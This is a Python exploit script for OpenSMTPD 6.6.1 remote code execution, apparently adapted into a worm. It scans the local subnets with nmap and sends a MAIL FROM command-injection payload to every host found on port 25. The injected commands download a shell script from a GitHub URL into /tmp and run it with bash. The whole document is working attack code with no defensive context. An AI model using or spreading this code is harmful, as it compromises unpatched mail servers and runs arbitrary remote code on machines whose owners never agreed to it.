# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Date: 2022
# Author: Eric
#!/usr/local/bin/python3

from socket import *
import sys
import time
import subprocess
import ipaddress

def paired(iterable):
	a = iter(iterable)
	return zip(a, a)

def find_subnets():
	ifconfig = subprocess.check_output(['ifconfig'], text = True)
	# rn i want this example inet 172.19.0.1  
	strs = ifconfig.split("\n ")
	lst = []
	for item in strs:
		if 'inet' in item and not '127.0.0.1' in item:
			lst.append(item)
	lst = str(lst)
	lst = lst.split("  ")
	
			
	targets = []
	for item in lst: #tryna get 1.2.3.4/255.255.0.0 etc
		if 'inet ' in item:
			i = item[6:] # to get 1.2.3.4
			i += '/24' # to get /24 time
			targets.append(str(i))
	
	myownaddy = targets[0] # need own addy so i dotn end upo sending shit twice
	# step 1 - find suitable targets for nmap complete
	
	nmap_res = []
	for item in targets:
		nmap_ret = subprocess.check_output(['nmap', item], text = True)
		if not 'All 1000 scanned ports on' in nmap_ret:
			strs = nmap_ret.split("\n")
			for i in strs:
				if 'Nmap scan report for' in i:
					nmap_scan_report = i.split('(')
					for losing_my_shit in nmap_scan_report:
						if not 'Nmap' in losing_my_shit and losing_my_shit != myownaddy:
							nmap_res.append(losing_my_shit.translate({ord(x): None for x in ')'})) # da ip

	return nmap_res # return the resolution of ips that are up
	
addy_list = find_subnets()
print(addy_list)
for ADDR in addy_list:
	PORT = 25
	print(ADDR + " " + str(PORT))
	CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']

	for cmdnum in range(len(CMD)):
		print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
		s = socket(AF_INET, SOCK_STREAM)
		s.connect((ADDR, PORT))
		res = s.recv(1024)
		if 'OpenSMTPD' not in str(res):
			print('[!] No OpenSMTPD detected')
			print('[!] Received {}'.format(str(res)))
			print('[!] Exiting...')
			sys.exit(1)

		print('[*] OpenSMTPD detected')
		s.send(b'HELO x\r\n')
		res = s.recv(1024)
		if '250' not in str(res):
			print('[!] Error connecting, expected 250')
			print('[!] Received: {}'.format(str(res)))
			print('[!] Exiting...')
			sys.exit(1)

		print('[*] Connected, sending payload' + CMD[cmdnum])
		s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
		res = s.recv(1024)
		if '250' not in str(res):
			print('[!] Error sending payload, expected 250')
			print('[!] Received: {}'.format(str(res)))
			print('[!] Exiting...')
			sys.exit(1)

		print('[*] Payload sent')
		s.send(b'RCPT TO:<root>\r\n')
		s.recv(1024)
		s.send(b'DATA\r\n')
		s.recv(1024)
		s.send(b'\r\nxxx\r\n.\r\n')
		s.recv(1024)
		s.send(b'QUIT\r\n')
		s.recv(1024)
		print('[*] Done')
		time.sleep(3)

